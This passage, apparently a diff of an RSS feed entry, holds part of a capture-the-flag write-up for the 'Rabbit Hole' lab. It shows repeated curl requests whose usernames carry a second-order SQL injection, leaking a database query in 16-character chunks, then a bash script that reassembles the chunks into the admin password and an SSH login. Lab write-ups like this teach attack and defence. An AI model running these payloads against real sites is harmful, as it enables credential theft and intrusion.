+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=11' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 161, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'      
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=12' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 177, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php' 
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=13' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 193, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+curl -i -s -k -X $'POST' \
+    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=14' \
+    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 209, 16) -- -&amp;password=asdf&amp;login=Submit+Query' \
+    $'http://rabbithole.thm/login.php'    
+
+<br> login.sh<br><img alt="Pasted image 20241117113546.png" src="pasted-image-20241117113546.png"><br>After the users are all logged in, we can query the index page for each user and see the 16 character blocks for each user. Here we can see the queries that get triggered while loading the index page.<br>curl -s http://rabbithole.thm -H 'Cookie: PHPSESSID=1' | grep -o '&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;' | tail -1 | sed -e 's/&lt;[^&gt;]*&gt;//g'
+<br>To automate this, we can use the following script to request for each user and concatenate the results.<br>get.sh<br>#!/bin/bash
+
+# Initialize an empty variable to store concatenated output
+result=""
+
+# Loop through each session ID from 1 to 14
+for i in {1..14}; do
+  # Get the relevant data and strip HTML tags
+  output=$(curl -s http://rabbithole.thm -H "Cookie: PHPSESSID=$i" | grep -o '&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;' | tail -1 | sed -e 's/&lt;[^&gt;]*&gt;//g')
+  
+  result+="$output"
+done
+
+# Print the final concatenated result
+echo "$result"
+
+<br> get.sh<br>chmod +x get.sh
+<br>./get.sh
+<br>Here we get the password of the admin user which we can use it for the ssh.<br><img alt="Pasted image 20241117114004.png" src="pasted-image-20241117114004.png"><br>Now, using the same password, let's ssh into the system.<br>ssh admin@rabbithole.thm
+<br><img alt="Pasted image 20241117114107.png" src="pasted-image-20241117114107.png"><br>And Here we find the password of the admin user.<br>]]></description><link>rabbit-hole.html</link><guid isPermaLink="false">Rabbit Hole.md</guid><pubDate>Sun, 17 Nov 2024 06:11:23 GMT</pubDate><enclosure url="pasted-image-20241116211332.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20241116211332.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
